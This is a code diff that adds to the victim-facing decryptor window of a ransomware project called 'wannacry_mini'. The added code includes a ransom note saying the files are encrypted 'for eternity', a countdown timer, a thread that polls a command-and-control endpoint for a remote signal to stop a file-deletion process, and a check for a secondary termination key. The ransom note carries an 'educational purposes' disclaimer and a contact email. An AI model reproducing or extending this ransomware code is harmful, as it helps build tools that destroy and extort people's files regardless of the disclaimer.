@@ -352,5 +352,80 @@ class DecryptorApp(tk.Tk):
             messagebox.showerror("Error", "No Machine ID found. The application will exit.")
             self.destroy()
         
-        threading.Thread(target=self.check_for_remote_stop_signal, args=(self.machine_id,), daemon=True).start()
+        threading.Thread(target=self.check_for_remote_stop, args=(self.machine_id,), daemon=True).start()
+
+    def check_for_remote_stop(self, machine_id, check_interval=10):
+        url = f"http://localhost/wannacry_mini/includes/api/check_stop_signal.php?machine_id={machine_id}"
+        while not self.stop_deletion:
+            try:
+                response = requests.get(url, timeout=10)
+                response.raise_for_status()
+                data = response.json()
+                if data.get("stop_signal") == "1":
+                    self.stop_deletion_process_remotely()
+                    break
+            except requests.exceptions.RequestException as e:
+                pass
+            time.sleep(check_interval)
+
+    def stop_deletion_process_remotely(self):
+        if not self.stop_deletion:
+            self.stop_deletion = True
+            self.deletion_stopped = True
+            self.stop_event.set()
+            self.log("Deletion process stopped by remote command.", 'blue')
+            if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
+                self.deletion_dialog.destroy()
+                self.deletion_dialog = None
+
+    def initialize_ui(self):
+        logo_image = Image.open(ICON_PATH).resize((300,300))
+        logo_photo = ImageTk.PhotoImage(logo_image)
+        frame = tk.Frame(self, bg='black')
+        frame.pack(pady=(20,20))
+
+        logo_label = tk.Label(frame, image=logo_photo, bg='red')
+        logo_label.image = logo_photo
+        logo_label.pack(side=tk.LEFT, padx=(20,10))
+
+        ransome_note = """OOPS! LOOKS LIKE YOUR FILES ARE ENCRYPTED WITH WANNACRY_MINI T_T (FOR ETERNITY) !! GOOD LUCK :)
+
         
+Just joking. This is a demo project for educational purposes only. 
+However, playing with malicious softwares are nowhere close to scary but they can be very harmful. 
+[ Users are fully acountable for their actions. ] 
+As this is a educational research type-ish project, 
+if you encrypt your files with wannacry_mini, then just contact to this email address 
+[ "sshhoommoo@gmail.com" ] 
+He will try whatever to restore your files.
+"""
+        ransome_note_label = tk.Text(frame, bg='black', font=('Helvetica', 12), wrap='word', height=16, width=60, borderwidth=0) 
+        ransome_note_label.pack(side=tk.LEFT, padx=(10,20))
+
+        ransome_note_label.tag_configure("center_red", justify='center', foreground='red')
+        ransome_note_label.insert(tk.END, ransome_note, "center_red")
+        ransome_note_label.tag_add("center_red", "1.0", "end")
+        ransome_note_label.configure(state='disabled')
+
+        self.timer_label = tk.Label(self, text="", fg='red', bg='black', font=('Helvetica', 12))
+        self.timer_label.pack(pady=(10, 10))
+
+        self.setup_key_frame()
+        self.setup_log_frame()
+        self.setup_progress_frame()
+
+    def stop_deletion_process(self):
+        if not self.stop_deletion:
+            self.stop_deletion = True
+            self.deletion_stopped = True
+            self.stop_event.set()
+            self.log("Deletion process stopped by secondary termination key.", 'white')
+            if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
+                self.deletion_dialog.destroy()
+
+    def check_secondary_termination(self):
+        response = simpledialog.askstring("Stop Deletion", "Enter the secondary termination key:", parent=self)
+        if response == SECONDARY_TERMINATION_KEY:
+            self.stop_deletion_process()
+        else:
+            messagebox.showerror("Error", "Incorrect secondary termination key.")
